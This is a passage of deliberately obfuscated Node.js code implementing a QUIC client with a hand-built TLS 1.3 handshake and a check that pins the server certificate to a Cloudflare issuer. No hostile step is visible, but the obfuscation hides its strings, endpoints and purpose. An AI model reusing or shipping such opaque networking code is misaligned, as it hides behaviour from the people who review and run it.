        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this['keyPair'] = a0k[im(0x47a)](d[im(0xc8c)]);
                continue;
            case '1':
                this[im(0x32d)] = d[im(0xa20)];
                continue;
            case '2':
                this[im(0x97b)] = null;
                continue;
            case '3':
                this[im(0xc99)] = im(0xae2);
                continue;
            case '4':
                this[im(0x6fa)] = c;
                continue;
            case '5':
                this[im(0x6ea)] = 0x20;
                continue;
            case '6':
                this['hash'] = d[im(0x949)];
                continue;
            case '7':
                this[im(0xba2)] = [];
                continue;
            case '8':
                this[im(0x9a0)] = null;
                continue;
            case '9':
                this[im(0x9cc)] = b;
                continue;
            case '10':
                this['serverName'] = a;
                continue;
            case '11':
                this[im(0xd09)] = null;
                continue;
            case '12':
                this[im(0x92d)] = this[im(0xc0f)]['publicKey']['export']({
                    'type': im(0x146),
                    'format': d[im(0x2ca)]
                })['subarray'](-0x20);
                continue;
            }
            break;
        }
    }
    ['transcript'](a) {
        const io = a0cm, b = {
                'njhqJ': function (f, g) {
                    return f === g;
                }
            }, c = a0k[io(0xb07)](this[io(0xad4)]), d = b[io(0xb6d)](a, undefined) ? this[io(0xba2)] : this[io(0xba2)][io(0x2d5)](0x0, a);
        for (const f of d) {
            c['update'](f);
        }
        return c[io(0x2f9)]();
    }
    [a0cm(0xca0)]() {
        const ip = a0cm, a = {
                'pQKrh': 'utf8',
                'aFBXQ': function (p, q) {
                    return p + q;
                },
                'IcFSm': function (p, q, r) {
                    return p(q, r);
                },
                'CydsF': function (p, q, r) {
                    return p(q, r);
                },
                'gQpsS': function (p, q, r) {
                    return p(q, r);
                },
                'ijWSd': function (p, q, r) {
                    return p(q, r);
                },
                'iDTHN': function (p, q) {
                    return p & q;
                },
                'GiTtv': function (p, q) {
                    return p >> q;
                },
                'VdHMX': function (p, q) {
                    return p & q;
                },
                'fXmLG': 'awaiting-server-hello'
            }, b = Buffer[ip(0x1e7)](this['serverName'], a[ip(0x1c4)]), c = new a0bt()[ip(0xd68)](a[ip(0x9d4)](b[ip(0x55c)], 0x3))[ip(0x347)](0x0)['u16'](b['length'])['bytes'](b)[ip(0x177)](), d = new a0bt()[ip(0xd68)](0x4)[ip(0xd68)](0x1d)[ip(0xd68)](0x17)[ip(0x177)](), f = new a0bt()[ip(0xd68)](0x8)[ip(0xd68)](0x403)['u16'](0x804)[ip(0xd68)](0x401)[ip(0xd68)](0x807)['build'](), g = new a0bt()[ip(0x347)](0x2)[ip(0xd68)](0x304)[ip(0x177)](), h = new a0bt()[ip(0xd68)](a[ip(0x9d4)](0x4, this[ip(0x92d)]['length']))[ip(0xd68)](0x1d)[ip(0xd68)](this[ip(0x92d)]['length'])[ip(0x6c9)](this[ip(0x92d)])[ip(0x177)](), i = Buffer[ip(0x5f9)]([
                Buffer[ip(0x1e7)]([this[ip(0x9cc)][ip(0x55c)]]),
                Buffer[ip(0x1e7)](this[ip(0x9cc)], a['pQKrh'])
            ]), j = new a0bt()['u16'](i[ip(0x55c)])[ip(0x6c9)](i)['build'](), k = new a0bt()['byte'](0x1)[ip(0x347)](0x1)[ip(0x177)](), l = Buffer[ip(0x5f9)]([
                a0bN(0x0, c),
                a[ip(0xd30)](a0bN, 0xa, d),
                a[ip(0xd30)](a0bN, 0xd, f),
                a[ip(0xd30)](a0bN, 0x2b, g),
                a0bN(0x33, h),
                a0bN(0x10, j),
                a[ip(0x275)](a0bN, 0x2d, k),
                a[ip(0x679)](a0bN, 0xff01, Buffer[ip(0x1e7)]([0x0])),
                a['ijWSd'](a0bN, 0x39, this[ip(0x6fa)])
            ]), m = Buffer['from']([
                0x0,
                0x4,
                0x13,
                0x1,
                0x13,
                0x2
            ]), n = Buffer[ip(0x5f9)]([
                Buffer[ip(0x1e7)]([
                    0x3,
                    0x3
                ]),
                a0k['randomBytes'](0x20),
                Buffer[ip(0x1e7)]([0x0]),
                m,
                Buffer['from']([
                    0x1,
                    0x0
                ]),
                Buffer[ip(0x1e7)]([
                    a[ip(0x7b0)](a[ip(0xd2d)](l[ip(0x55c)], 0x8), 0xff),
                    a['VdHMX'](l[ip(0x55c)], 0xff)
                ]),
                l
            ]), o = a0bM(0x1, n);
        return this[ip(0xba2)]['push'](o), this[ip(0xc99)] = a['fXmLG'], o;
    }
    [a0cm(0x6f6)](a) {
        const iq = a0cm, b = {
                'BRmQJ': function (d, f) {
                    return d < f;
                },
                'Fdkuj': function (d, f) {
                    return d !== f;
                },
                'bBbVN': function (d, f) {
                    return d < f;
                },
                'vIaan': function (d, f) {
                    return d + f;
                }
            };
        if (b[iq(0x741)](a['length'], 0x4))
            return null;
        if (b[iq(0x42f)](a[0x0], 0x2))
            throw new Error(iq(0x5db));
        const c = a[iq(0x268)](0x1, 0x3);
        if (b[iq(0x17e)](a[iq(0x55c)], b['vIaan'](0x4, c)))
            return null;
        return a[iq(0x262)](0x0, 0x4 + c);
    }
    [a0cm(0xa4b)](a) {
        const ir = a0cm, b = {
                'bTrbC': ir(0x1fd),
                'aljbD': function (q, r) {
                    return q < r;
                },
                'uxhTa': function (q, r) {
                    return q >= r;
                },
                'CepAf': function (q, r) {
                    return q === r;
                },
                'cWTYA': function (q, r) {
                    return q !== r;
                },
                'eiASl': ir(0x391),
                'WjiLZ': ir(0x979),
                'aPFwY': function (q, r) {
                    return q + r;
                },
                'LiwSi': ir(0x5e2),
                'skVLH': 'sha256',
                'KUVrI': ir(0xba4),
                'buelq': ir(0x207),
                'TOHhj': ir(0x941),
                'ZJuGt': ir(0xab0),
                'jFvxD': ir(0x3da),
                'veZqd': ir(0x146),
                'UMMnr': function (q, r, s, t) {
                    return q(r, s, t);
                },
                'rBubv': function (q, r, s, t, u, v) {
                    return q(r, s, t, u, v);
                },
                'YAExG': ir(0x3a1),
                'PBmuz': function (q, r, s, t) {
                    return q(r, s, t);
                },
                'PyprC': ir(0x3a9)
            }, c = new a0bu(a['subarray'](0x4));
        c['u16']();
        const d = c['bytes'](0x20);
        if (d[ir(0x20b)](a0bf))
            throw new Error(b[ir(0xc5d)]);
        const f = c['bytes'](c['byte']()), g = c[ir(0xd68)]();
        c[ir(0x347)]();
        let h = null;
        const i = c['u16']();
        let j = 0x0;
        while (b[ir(0x92a)](j, i) && b[ir(0x75d)](c[ir(0x90b)], 0x4)) {
            const q = c[ir(0xd68)](), r = c[ir(0xd68)](), s = c[ir(0x6c9)](r);
            j += 0x1;
            if (q === 0x33 && b[ir(0x75d)](s[ir(0x55c)], 0x4)) {
                const t = new a0bu(s), u = t[ir(0xd68)](), v = t['u16']();
                h = {
                    'group': u,
                    'key': t[ir(0x6c9)](v)
                };
            } else {
                if (b['CepAf'](q, 0x2b) && b['uxhTa'](s[ir(0x55c)], 0x2)) {
                    if (b['cWTYA'](s[ir(0xe5)](0x0), 0x304))
                        throw new Error(b[ir(0x553)]);
                }
            }
        }
        if (h === null)
            throw new Error(b[ir(0x485)]);
        if (b[ir(0x7e2)](h[ir(0xce1)], 0x1d))
            throw new Error(b[ir(0x3ab)](b[ir(0x169)], h[ir(0xce1)]));
        if (b[ir(0x498)](g, 0x1301))
            this[ir(0xad4)] = b[ir(0x753)], this[ir(0x6ea)] = 0x20, this['cipher'] = b[ir(0x5c7)];
        else {
            if (g === 0x1302)
                this['hash'] = b['buelq'], this[ir(0x6ea)] = 0x30, this[ir(0x32d)] = b[ir(0x5eb)];
            else
                throw new Error(ir(0x6e5) + g['toString'](0x10));
        }
        this[ir(0xba2)][ir(0x1d5)](a);
        const k = a0k[ir(0x70a)]({
                'key': Buffer[ir(0x5f9)]([
                    Buffer[ir(0x1e7)](b[ir(0xba3)], ir(0x47c)),
                    h['key']
                ]),
                'format': b['jFvxD'],
                'type': b['veZqd']
            }), l = a0k[ir(0x41d)]({
                'privateKey': this[ir(0xc0f)][ir(0x80c)],
                'publicKey': k
            }), m = Buffer[ir(0x2d9)](this[ir(0x6ea)]), n = b['UMMnr'](a0bv, this[ir(0xad4)], m, m), o = b['rBubv'](a0bx, this['hash'], n, b['YAExG'], a0k[ir(0xb07)](this[ir(0xad4)])[ir(0x2f9)](), this[ir(0x6ea)]);
        this['handshakeSecret'] = b['PBmuz'](a0bv, this[ir(0xad4)], o, l);
        const p = this['transcript']();
        return this[ir(0x4a9)] = b[ir(0x257)](a0bx, this['hash'], this['handshakeSecret'], 'c\x20hs\x20traffic', p, this[ir(0x6ea)]), this[ir(0xd96)] = a0bx(this[ir(0xad4)], this[ir(0x891)], 's\x20hs\x20traffic', p, this['hashLength']), this[ir(0xc99)] = b['PyprC'], {
            'send': new a0by(this['hash'], this[ir(0x32d)], this[ir(0x4a9)]),
            'recv': new a0by(this[ir(0xad4)], this['cipher'], this[ir(0xd96)])
        };
    }
    ['handleHandshakeMessage'](a) {
        const is = a0cm, b = {
                'ljDIY': function (u, v) {
                    return u === v;
                },
                'Ftiix': function (u, v) {
                    return u < v;
                },
                'Harfi': function (u, v) {
                    return u >= v;
                },
                'fIzGw': function (u, v) {
                    return u === v;
                },
                'cetFQ': function (u, v) {
                    return u(v);
                },
                'vcLwg': is(0x7d9),
                'ryhKi': function (u, v) {
                    return u === v;
                },
                'zKvvu': function (u, v) {
                    return u <= v;
                },
                'zUDLy': function (u, v) {
                    return u + v;
                },
                'NVMcl': function (u, v) {
                    return u + v;
                },
                'QJnQI': function (u, v) {
                    return u >= v;
                },
                'xlBGm': function (u, v) {
                    return u > v;
                },
                'uzfUS': function (u, v) {
                    return u + v;
                },
                'wQFuC': function (u, v) {
                    return u + v;
                },
                'AtXAL': function (u, v) {
                    return u + v;
                },
                'YXeII': function (u, v) {
                    return u !== v;
                },
                'QDULn': function (u, v) {
                    return u - v;
                },
                'fLphM': function (u, v) {
                    return u - v;
                },
                'uBrrp': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'HfRhI': is(0xc50),
                'BvGpx': is(0x3a1),
                'jDVrv': function (u, v, w, x) {
                    return u(v, w, x);
                },
                'ZbTwK': is(0x2ad),
                'jSYjM': function (u, v, w, x, y, z) {
                    return u(v, w, x, y, z);
                },
                'MBggr': is(0xd47)
            };
        this[is(0xba2)][is(0x1d5)](a);
        const c = a[0x0];
        if (b[is(0x69e)](c, 0x8)) {
            const u = new a0bu(a[is(0x262)](0x4)), v = u[is(0xd68)]();
            let w = 0x0;
            while (b[is(0xc35)](w, v) && b[is(0xd53)](u[is(0x90b)], 0x4)) {
                const x = u[is(0xd68)](), y = u[is(0xd68)](), z = u[is(0x6c9)](y);
                w += 0x1;
                if (b['fIzGw'](x, 0x39))
                    this[is(0xd09)] = b[is(0x5ca)](a0bK, Buffer[is(0x1e7)](z));
                else
                    b[is(0xb23)](x, 0x10) && z[is(0x55c)] >= 0x3 && (this[is(0x97b)] = z[is(0x262)](0x3)[is(0x7a0)](b[is(0x8fa)]));
            }
            return null;
        }
        if (b['ryhKi'](c, 0xb)) {
            const A = a[is(0x262)](0x4);
            if (A['length'] >= 0x4) {
                const B = 0x1 + A[0x0];
                if (b[is(0x5df)](b[is(0x49d)](B, 0x3), A[is(0x55c)])) {
                    const C = A[is(0x268)](B, 0x3);
                    if (b[is(0x5df)](b['NVMcl'](b[is(0x49d)](B, 0x3), C), A[is(0x55c)]) && b[is(0x15f)](C, 0x3)) {
                        const D = A['readUIntBE'](b[is(0xcb4)](B, 0x3), 0x3);
                        b[is(0xd05)](D, 0x0) && b[is(0x1f1)](b[is(0x98e)](B, 0x6), D) <= A[is(0x55c)] && (this[is(0x9a0)] = Buffer['from'](A[is(0x262)](b[is(0xc73)](B, 0x6), b[is(0x98e)](B, 0x6) + D)));
                    }
                }
            }
            return null;
        }
        if (b[is(0xb23)](c, 0xf) || b[is(0x69e)](c, 0x4))
            return null;
        if (b[is(0x2a4)](c, 0x14))
            return null;
        const d = this[is(0xba2)][b['QDULn'](this[is(0xba2)][is(0x55c)], 0x1)], f = d[is(0x262)](0x4), g = this[is(0x7ad)](b[is(0x76e)](this[is(0xba2)][is(0x55c)], 0x1)), h = b[is(0x489)](a0bx, this['hash'], this[is(0xd96)], b['HfRhI'], Buffer['alloc'](0x0), this[is(0x6ea)]), i = a0k[is(0x5d4)](this['hash'], h)[is(0x442)](g)[is(0x2f9)](), j = i['length'] === f['length'] && a0k[is(0x6bc)](i, f), k = a0bx(this[is(0xad4)], this[is(0x4a9)], b['HfRhI'], Buffer[is(0x2d9)](0x0), this[is(0x6ea)]), l = this['transcript'](), m = a0k[is(0x5d4)](this[is(0xad4)], k)[is(0x442)](l)[is(0x2f9)](), n = a0bM(0x14, m), o = Buffer['alloc'](this[is(0x6ea)]), p = a0bx(this[is(0xad4)], this[is(0x891)], b['BvGpx'], a0k[is(0xb07)](this[is(0xad4)])['digest'](), this[is(0x6ea)]), q = b[is(0xd51)](a0bv, this['hash'], p, o), r = this[is(0x7ad)]();
        this[is(0xba2)]['push'](n);
        const s = b[is(0x489)](a0bx, this['hash'], q, b[is(0x91e)], r, this['hashLength']), t = b[is(0x62d)](a0bx, this['hash'], q, is(0xc79), r, this[is(0x6ea)]);
        return this[is(0xc99)] = b[is(0x52c)], {
            'verified': j,
            'finished': n,
            'send': new a0by(this[is(0xad4)], this[is(0x32d)], s),
            'recv': new a0by(this['hash'], this[is(0x32d)], t)
        };
    }
}
function a0bP(a) {
    const it = a0cm, b = {
            'tQXya': it(0x105),
            'eqoHG': function (k, l) {
                return k === l;
            },
            'QpHTV': it(0x604),
            'qkrLC': function (k, l) {
                return k + l;
            },
            'iYyvE': 'unreadable\x20edge\x20certificate:\x20',
            'MEOZN': function (k, l) {
                return k(l);
            },
            'wBxPL': 'O=CloudFlare,\x20Inc.',
            'gxdIW': function (k, l) {
                return k + l;
            },
            'EPqPC': 'issuer\x20O\x20mismatch:\x20',
            'udgLP': it(0xa8a),
            'DDrpW': function (k, l) {
                return k + l;
            },
            'xCkkm': it(0xd5d),
            'ITBZA': it(0x440),
            'oavWS': it(0x195),
            'mqNET': it(0x358)
        };
    if (!a || !a['length'])
        return it(0xa53);
    let c;
    try {
        c = new a0k[(it(0x25a))](a);
    } catch (k) {
        return b[it(0x360)](b['iYyvE'], k['message']);
    }
    const d = l => String(l || '')[it(0x3a0)](/\\,/g, ','), f = b[it(0x1ac)](d, c[it(0x5a0)]), g = b['MEOZN'](d, c[it(0x162)]);
    if (!f['includes'](b[it(0xac8)]))
        return b['gxdIW'](b[it(0xcf4)], f);
    if (!f['includes'](b[it(0x274)]))
        return b['DDrpW'](b[it(0x5ef)], f);
    if (!g[it(0x134)](b[it(0x63f)]))
        return b[it(0xd03)](b[it(0x8b5)], g);
    const h = b[it(0x1ac)](String, c[it(0x18b)] || '')[it(0xb0c)](',')['map'](l => l[it(0x58a)]()[it(0x426)]()), i = it(0x4d1), j = h[it(0x758)](l => {
            const iu = it;
            if (!l['startsWith'](b['tQXya']))
                return ![];
            const m = l[iu(0x2d5)](0x4);
            return b[iu(0xce4)](m, i) || b[iu(0xce4)](m, b[iu(0x6d3)]) || m['startsWith']('*.') && i[iu(0xb13)](m[iu(0x2d5)](0x1));
        });
    if (!j)
        return b[it(0xd03)](b[it(0xd03)](b[it(0xd77)], String(c[it(0x18b)] || '')), ')');
    return null;
}
class a0bQ {
    constructor(a, b, c) {
        const iv = a0cm, d = { 'LeOqc': iv(0x5cf) }, f = d[iv(0x73a)]['split']('|');
        let g = 0x0;
        while (!![]) {
            switch (f[g++]) {
            case '0':
                this[iv(0xa16)] = Buffer[iv(0x2d9)](0x0);
                continue;
            case '1':
                this[iv(0xc8f)] = 0x0;
                continue;
            case '2':
                this['id'] = b;
                continue;
            case '3':
                this[iv(0x34a)] = new a0bE();
                continue;
            case '4':
                this[iv(0xbd8)] = ![];
                continue;
            case '5':
                this['userData'] = null;
                continue;
            case '6':
                this[iv(0xb5e)] = a;
                continue;
            case '7':
                this[iv(0x15e)] = c;
                continue;
            case '8':
                this['consumed'] = 0x0;
                continue;
            case '9':
                this[iv(0x3f2)] = a[iv(0x9ce)];
                continue;
            case '10':
                this['sentEnd'] = 0x0;
                continue;
            case '11':
                this[iv(0x271)] = ![];
                continue;
            case '12':
                this[iv(0x77d)] = new a0bD(a);
                continue;
            }
            break;
        }
    }
    [a0cm(0x10b)](a, b) {
        const iw = a0cm, c = {
                'HSWSE': function (d, f) {
                    return d(f);
                }
            };
        this[iw(0x77d)][iw(0x329)](a, c[iw(0x86c)](Boolean, b)), this[iw(0xb5e)][iw(0x77c)](this);
    }
}
class a0bR {
    constructor(a) {
        const ix = a0cm, b = {
                'uPYfT': function (f, g) {
                    return f << g;
                },
                'LjOIz': function (f, g) {
                    return f * g;
                },
                'UvIHV': function (f, g) {
                    return f << g;
                },
                'vkaxU': function (f, g) {
                    return f * g;
                },
                'wASpK': function (f, g) {
                    return f === g;
                },
                'dInBE': function (f, g) {
                    return f === g;
                },
                'Ryfbh': function (f, g) {
                    return f === g;
                },
                'HgzYR': function (f, g) {
                    return f << g;
                },
                'RknwZ': function (f, g) {
                    return f * g;
                }
            }, c = '70|50|31|62|0|39|23|54|51|57|9|26|37|58|13|45|65|15|47|42|44|18|52|32|74|55|5|38|22|14|7|34|33|35|53|12|59|49|30|1|17|36|48|29|68|75|61|8|64|27|21|6|40|19|10|69|66|2|67|11|60|41|28|20|46|25|71|73|76|43|24|3|16|4|72|63|56'[ix(0xb0c)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[ix(0x9cc)] = a[ix(0x9cc)] || a0bc;
                continue;
            case '1':
                this[ix(0x530)] = Buffer['alloc'](0x0);
                continue;
            case '2':
                this['pto'] = 0xfa;
                continue;
            case '3':
                this[ix(0x439)] = ![];
                continue;
            case '4':
                this[ix(0x8e0)] = null;
                continue;
            case '5':
                this[ix(0x8b3)] = null;
                continue;
            case '6':
                this[ix(0x7ed)] = [];
                continue;
            case '7':
                this[ix(0x7f8)] = [
                    null,
                    null
                ];
                continue;
            case '8':
                this[ix(0x541)] = 0x0;
                continue;
            case '9':
                this[ix(0x9ce)] = a[ix(0x9ce)] || b[ix(0x81d)](0x1, 0x14);
                continue;
            case '10':
                this[ix(0x176)] = ![];
                continue;
            case '11':
                this[ix(0x297)] = a[ix(0x297)] || b[ix(0x1fb)](0xa, this[ix(0x86a)]);
                continue;
            case '12':
                this[ix(0x6ca)] = [
                    ![],
                    ![],
                    ![]
                ];
                continue;
            case '13':
                this['onStreamData'] = a['onStreamData'] || function () {
                };
                continue;
            case '14':
                this[ix(0x992)] = [];
                continue;
            case '15':
                this[ix(0x39b)] = a0k[ix(0x395)](0x8);
                continue;
            case '16':
                this[ix(0xb68)] = 0x0;
                continue;
            case '17':
                this[ix(0x6fb)] = Buffer['alloc'](0x0);
                continue;
            case '18':
                this[ix(0x579)] = a0bL([
                    [
                        a0bp[ix(0xc30)],
                        this[ix(0xc86)]
                    ],
                    [
                        a0bp['initialMaxData'],
                        this[ix(0x265)]
                    ],
                    [
                        a0bp[ix(0x2ba)],
                        this[ix(0x9ce)]
                    ],
                    [
                        a0bp[ix(0x649)],
                        this['localStreamData']
                    ],
                    [
                        a0bp[ix(0x89c)],
                        this['localStreamData']
                    ],
                    [
                        a0bp[ix(0x112)],
                        b[ix(0xc70)](0x1, 0x18)
                    ],
                    [
                        a0bp[ix(0x6f4)],
                        b[ix(0xc70)](0x1, 0x18)
                    ],
                    [
                        a0bp[ix(0xa76)],
                        this[ix(0x86a)]
                    ],
                    [
                        a0bp[ix(0xa19)],
                        0x8
                    ],
                    [
                        a0bp['initialSourceConnectionId'],
                        this['ourCid']
                    ]
                ]);
                continue;
            case '19':
                this['finishedSent'] = ![];
                continue;
            case '20':
                this[ix(0xd7d)] = b[ix(0x63c)](this[ix(0x384)], this[ix(0x86a)]);
                continue;
            case '21':
                this[ix(0x897)] = [];
                continue;
            case '22':
                this[ix(0x40f)] = [
                    null,
                    null,
                    null
                ];
                continue;
            case '23':
                this[ix(0xc86)] = b[ix(0x854)](a[ix(0xc86)], undefined) ? 0x7530 : a[ix(0xc86)];
                continue;
            case '24':
                this[ix(0xa69)] = 0x0;
                continue;
            case '25':
                this[ix(0x80e)] = null;
                continue;
            case '26':
                this[ix(0x3db)] = b[ix(0xb49)](a[ix(0x3db)], !![]);
                continue;
            case '27':
                this['creditMaxData'] = ![];
                continue;
            case '28':
                this['slowStartThreshold'] = Infinity;
                continue;
            case '29':
                this[ix(0x4e1)] = 0x0;
                continue;
            case '30':
                this['tlsOffsets'] = [
                    new a0bE(),
                    new a0bE(),
                    new a0bE()
                ];
                continue;
            case '31':
                this['port'] = a[ix(0x597)];
                continue;
            case '32':
                this['socket'] = null;
                continue;
            case '33':
                this[ix(0x783)] = [
                    0x0,
                    0x0,
                    0x0
                ];
                continue;
            case '34':
                this[ix(0x9c9)] = 0x0;
                continue;
            case '35':
                this[ix(0xd6c)] = [
                    -0x1,
                    -0x1,
                    -0x1
                ];
                continue;
            case '36':
                this['streams'] = new Map();
                continue;
            case '37':
                this['onReady'] = a[ix(0xc4f)] || function () {
                };
                continue;
            case '38':
                this['settle'] = null;
                continue;
            case '39':
                this[ix(0x86a)] = a['maxPacket'] || a0bi;
                continue;
            case '40':
                this[ix(0x4a7)] = ![];
                continue;
            case '41':
                this[ix(0x7aa)] = this[ix(0x297)];
                continue;
            case '42':
                this['receiveWindow'] = a['receiveWindow'] || 0x1 << 0x14;
                continue;
            case '43':
                this[ix(0x1dd)] = 0x0;
                continue;
            case '44':
                this[ix(0x39a)] = ![];
                continue;
            case '45':
                this['onStreamEnd'] = a[ix(0x3aa)] || function () {
                };
                continue;
            case '46':
                this['srtt'] = null;
                continue;
            case '47':
                this['peerCid'] = a0k[ix(0x395)](0x8);
                continue;
            case '48':
                this[ix(0xb66)] = [];
                continue;
            case '49':
                this[ix(0x8f8)] = [
                    new a0bD(this),
                    new a0bD(this),
                    new a0bD(this)
                ];
                continue;
            case '50':
                this[ix(0x78f)] = a[ix(0x78f)];
                continue;
            case '51':
                this[ix(0x384)] = a[ix(0x384)] || 0x100;
                continue;
            case '52':
                this[ix(0x2ae)] = new a0bO(this['serverName'], this['alpn'], this[ix(0x579)]);
                continue;
            case '53':
                this[ix(0x1ff)] = [
                    [],
                    [],
                    []
                ];
                continue;
            case '54':
                this[ix(0xae3)] = b[ix(0x5b4)](a[ix(0xae3)], undefined) ? 0x3e8 : a[ix(0xae3)];
                continue;
            case '55':
                this[ix(0xbdb)] = ![];
                continue;
            case '56':
                this[ix(0x7d8)] = {
                    'rx': 0x0,
                    'tx': 0x0,
                    'rxBytes': 0x0,
                    'txBytes': 0x0,
                    'dropped': 0x0,
                    'retransmits': 0x0
                };
                continue;
            case '57':
                this[ix(0x265)] = a[ix(0x265)] || b[ix(0xc46)](0x1, 0x16);
                continue;
            case '58':
                this[ix(0x784)] = a[ix(0x784)] || function () {
                };
                continue;
            case '59':
                this[ix(0x13b)] = [
                    [],
                    [],
                    []
                ];
                continue;
            case '60':
                this['minWindow'] = b[ix(0x634)](0x2, this['maxPacket']);
                continue;
            case '61':
                this[ix(0x95d)] = 0x0;
                continue;
            case '62':
                this[ix(0xd9c)] = a[ix(0xd9c)] || a[ix(0x78f)];
                continue;
            case '63':
                this[ix(0xd09)] = null;
                continue;
            case '64':
                this[ix(0x704)] = 0x0;
                continue;
            case '65':
                this[ix(0x7fc)] = a['onClose'] || function () {
                };
                continue;
            case '66':
                this['registrationFailed'] = ![];
                continue;
            case '67':
                this[ix(0x60d)] = 0x0;
                continue;
            case '68':
                this[ix(0x12d)] = 0x0;
                continue;
            case '69':
                this[ix(0x698)] = ![];
                continue;
            case '70':
                this[ix(0x305)] = a[ix(0xae7)];
                continue;
            case '71':
                this['peerMaxAckDelay'] = 0x19;
                continue;
            case '72':
                this['peerToken'] = Buffer[ix(0x2d9)](0x0);
                continue;
            case '73':
                this['ptoCount'] = 0x0;
                continue;
            case '74':
                this[ix(0x874)] = null;
                continue;
            case '75':
                this[ix(0xb7e)] = 0x0;
                continue;
            case '76':
                this['kPacketThreshold'] = 0x3;
                continue;
            }
            break;
        }
    }
    get [a0cm(0x691)]() {
        const iy = a0cm, a = {
                'gDxkS': function (b, c) {
                    return b === c;
                }
            };
        return a[iy(0x344)](this[iy(0x39a)], !![]);
    }
    set [a0cm(0x691)](a) {
        const iz = a0cm, b = {
                'TLCwN': function (c, d) {
                    return c === d;
                }
            };
        this[iz(0x39a)] = b[iz(0x588)](a, !![]), this['_stoppedFlag'] && !this['closed'] && !this[iz(0xbdb)] && this['close'](iz(0x707));
    }
    [a0cm(0x795)]() {
        const iA = a0cm, a = {
                'DYCoG': iA(0x415),
                'GhEte': function (b, c) {
                    return b + c;
                },
                'NGUNF': iA(0xd8a),
                'ChBrc': iA(0x785),
                'hZpaz': iA(0x1fc),
                'oYcZw': 'error'
            };
        return new Promise((b, c) => {
            const iB = iA, d = a[iB(0x1e4)][iB(0xb0c)]('|');
            let f = 0x0;
            while (!![]) {
                switch (d[f++]) {
                case '0':
                    this[iB(0xa05)][iB(0x812)](0x0, iB(0x156), () => this[iB(0xa22)]());
                    continue;
                case '1':
                    this[iB(0xa05)] = a0a3[iB(0x643)](a[iB(0x4d5)]);
                    continue;
                case '2':
                    this[iB(0xbb2)] = {
                        'resolve': b,
                        'reject': c
                    };
                    continue;
                case '3':
                    this[iB(0xa05)]['on'](iB(0xbe8), g => {
                        const iC = iB;
                        try {
                            this[iC(0x8ea)](g);
                        } catch (h) {
                            this[iC(0x6a5)](a[iC(0x839)] + h);
                        }
                    });
                    continue;
                case '4':
                    this[iB(0xa05)]['on'](a[iB(0xd2e)], g => {
                        const iD = iB;
                        !this[iD(0x874)] && this[iD(0x6a5)](a['GhEte'](a[iD(0x6ab)], g[iD(0xbe8)]));
                    });
                    continue;
                }
                break;
            }
        });
    }
    [a0cm(0xa22)]() {
        const iE = a0cm, a = {
                'UuuFR': function (d, f) {
                    return d + f;
                },
                'StkGL': function (d, f) {
                    return d + f;
                },
                'Xllfq': iE(0x296),
                'UCfLO': iE(0xb47),
                'gUvek': iE(0x20a),
                'zdFHM': function (d, f, g) {
                    return d(f, g);
                }
            }, b = iE(0x77e)['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[iE(0xb7c)]();
                continue;
            case '1':
                this['lastReceived'] = Date['now']();
                continue;
            case '2':
                this[iE(0x305)][iE(0x3a5)](a[iE(0x507)](a[iE(0x507)](a[iE(0x507)](a[iE(0xcd3)](a[iE(0x587)], this[iE(0x78f)]), ':') + this[iE(0x597)] + a[iE(0xb19)], this[iE(0x9cc)]), a['gUvek']) + this[iE(0x2e2)][iE(0x7a0)](iE(0x47c)));
                continue;
            case '3':
                this[iE(0x8f8)][a0bk][iE(0x329)](this['tls'][iE(0xca0)](), ![]);
                continue;
            case '4':
                this['interval'] = a[iE(0x17c)](setInterval, () => this['_tick'](), 0x14);
                continue;
            case '5':
                this[iE(0xa69)] = Date[iE(0x866)]();
                continue;
            case '6':
                this[iE(0x40f)][a0bk] = a[iE(0x17c)](a0bA, this[iE(0x2e2)], !![]);
                continue;
            }
            break;
        }
    }
    [a0cm(0xb7c)]() {
        const iF = a0cm, a = {
                'grcHM': function (d, f) {
                    return d >= f;
                },
                'eJbgv': function (d, f) {
                    return d - f;
                },
                'OwcIf': function (d, f) {
                    return d < f;
                },
                'Epheo': function (d, f) {
                    return d < f;
                },
                'hyXlz': function (d, f) {
                    return d > f;
                },
                'qObqu': function (d, f) {
                    return d - f;
                },
                'vQYXY': function (d, f) {
                    return d + f;
                },
                'VvMjs': function (d, f) {
                    return d + f;
                },
                'XTPxo': iF(0x7f4),
                'QQujw': function (d, f) {
                    return d - f;
                }
            };
        if (this[iF(0x874)])
            return;
        const b = Date[iF(0x866)]();
        this[iF(0x6b0)](b);
        this['keepAlive'] && this[iF(0x4a7)] && a[iF(0x225)](a[iF(0x42b)](b, this['lastEliciting']), this[iF(0xae3)]) && (this[iF(0x439)] = !![]);
        let c = 0x0;
        while (a[iF(0x648)](c, 0x10) && a[iF(0x648)](this[iF(0xb22)](), this['maxInflight']) && (a[iF(0xb5a)](this[iF(0xd3b)](), this[iF(0x831)]()) || this[iF(0x8af)]() || this[iF(0xbdb)])) {
            const d = this[iF(0x3a3)]();
            if (d === null)
                break;
            this[iF(0x641)](d), c += 0x1;
        }
        a[iF(0xa26)](a[iF(0x1d7)](b, this['lastReceived']), Math[iF(0x60c)](this[iF(0xc86)], 0x3a98)) && this['_fail'](a['vQYXY'](a[iF(0x19c)](a[iF(0x5b7)], a[iF(0x60a)](b, this[iF(0x1dd)])), 'ms'));
    }
    [a0cm(0xb22)]() {
        const iG = a0cm, a = {
                'ncZjW': function (b, c) {
                    return b + c;
                }
            };
        return a['ncZjW'](this['inFlight'][0x0][iG(0x55c)] + this[iG(0x13b)][0x1][iG(0x55c)], this[iG(0x13b)][0x2][iG(0x55c)]);
    }
    [a0cm(0x8af)]() {
        const iH = a0cm, a = {
                'ZmgLL': function (b, c) {
                    return b < c;
                },
                'EcSBm': function (b, c) {
                    return b !== c;
                }
            };
        for (let b = 0x0; a[iH(0x930)](b, 0x3); b++) {
            if (a[iH(0x21a)](this[iH(0x40f)][b], null) && this['ackPending'][b] && this['recvRanges'][b][iH(0x55c)])
                return !![];
        }
        return ![];
    }
    [a0cm(0xd3b)]() {
        const iI = a0cm, a = {
                'MYEAt': function (c, d) {
                    return c < d;
                }
            };
        let b = 0x0;
        for (let c = 0x0; a[iI(0xd44)](c, 0x3); c++) {
            for (const d of this[iI(0x13b)][c]) {
                b += d[iI(0x6c9)];
            }
        }
        return b;
    }
    [a0cm(0x831)]() {
        const iJ = a0cm;
        return this[iJ(0x4a7)] ? this['congestionWindow'] : Infinity;
    }
